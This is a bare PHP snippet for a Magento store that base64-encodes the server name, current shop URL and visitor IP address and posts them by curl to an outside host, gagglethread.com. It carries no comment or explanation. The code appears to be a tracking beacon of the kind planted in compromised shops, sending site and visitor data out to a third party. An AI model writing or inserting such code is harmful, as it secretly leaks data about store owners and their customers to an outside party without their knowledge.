<?php
$ch = curl_init("http://gagglethread.com/curl.php");
$postFields='';
if(isset($_SERVER["SERVER_NAME"]))
{
	$postFields='server='.base64_encode($_SERVER["SERVER_NAME"]).'&';
}
$shopUrl=base64_encode(Mage::helper('core/url')->getCurrentUrl());
$ip=base64_encode($_SERVER['REMOTE_ADDR']);
$postFields.='url='.$shopUrl.'&ip='.$ip;
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS,$postFields);
$output=curl_exec($ch);
curl_close($ch);